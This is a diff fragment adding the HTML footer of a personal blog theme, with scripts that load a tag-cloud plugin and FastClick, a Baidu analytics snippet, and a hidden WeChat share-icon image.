+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
